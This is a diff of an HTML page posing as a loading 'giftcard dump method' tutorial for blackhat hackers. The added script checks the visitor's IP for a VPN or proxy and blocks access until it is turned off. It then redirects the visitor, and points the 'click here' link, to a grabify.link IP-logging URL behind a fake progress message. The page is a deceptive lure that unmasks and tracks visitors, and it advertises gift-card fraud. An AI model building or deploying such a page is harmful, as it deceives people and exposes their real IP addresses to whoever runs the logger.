@@ -2,10 +2,44 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta http-equiv="refresh" content="0; url="https://grabify.link/4KCZ9K" />
   <title>giftcard dump method (blackhat hackers)</title>
+  <script>
+    // Load links from JSON
+    const links = {
+      "redirect_link": "https://grabify.link/4KCZ9K",
+      "click_here_link": "https://grabify.link/4KCZ9K"
+    };
+
+    // VPN Detection
+    async function checkVPN() {
+      try {
+        const response = await fetch('https://ipapi.co/json/');
+        const data = await response.json();
+        // ipapi.co returns "true" for 'proxy' if a VPN/proxy is detected
+        if (data.proxy || data.isp && data.isp.toLowerCase().includes('vpn')) {
+          document.body.innerHTML = "<h2>VPN/Proxy detected. Please disable your VPN to access this page.</h2>";
+        } else {
+          // No VPN detected, proceed with redirect
+          setTimeout(() => {
+            window.location.href = links.redirect_link;
+          }, 30000); // 30 seconds
+        }
+      } catch (e) {
+        document.body.innerHTML = "<h2>Error detecting VPN. Please try again later.</h2>";
+      }
+    }
+
+    window.onload = checkVPN;
+  </script>
 </head>
 <body>
-  <p>tutorial is loading, 357-b of 3.44-mb If you are not shown the tutorial after 30 seconds, <a href="https://grabify.link/4KCZ9K">click here</a>.</p>
+  <p>
+    Tutorial is loading, 357-b of 3.44-mb. If you are not shown the tutorial after 30 seconds,
+    <a id="clickHere" href="https://grabify.link/4KCZ9K">click here</a>.
+  </p>
+  <script>
+    // Set the "click here" link from JSON
+    document.getElementById('clickHere').href = links.click_here_link;
+  </script>
 </body>
 </html>
